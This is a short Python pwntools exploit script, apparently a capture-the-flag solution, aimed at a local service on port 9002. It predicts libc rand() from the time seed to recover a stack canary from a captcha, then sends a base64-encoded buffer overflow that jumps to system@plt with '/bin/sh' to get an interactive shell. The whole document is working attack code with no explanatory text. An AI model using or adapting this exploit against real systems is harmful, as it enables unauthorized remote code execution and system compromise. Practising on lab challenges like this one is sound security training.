from pwn import *

import ctypes
from ctypes.util import find_library

libc = ctypes.CDLL(find_library('c'))
libc.srand(libc.time(0))
arr = [libc.rand() for i in range(8)]

p = remote('localhost', 9002)

print p.recvuntil('captcha : ')
pw = p.recvline()
canary = (int(pw)-arr[4]+arr[6]-arr[7]-arr[2]+arr[3]-arr[1]-arr[5]) & 0xffffffff
log.success('canary is 0x%08x' % canary)

p.send(pw)
print p.recvuntil('paste me!')

plain = 'a'*512 + p32(canary)
plain += 'a'*(528 - len(plain))
plain += p32(0x08049187) # system plt
plain += p32(0x0804b0e0 + 717)
base = plain.encode('base64').replace('\n', '')

print 'base64: %s' % base
p.sendline(base + '\x00/bin/sh')

p.interactive()
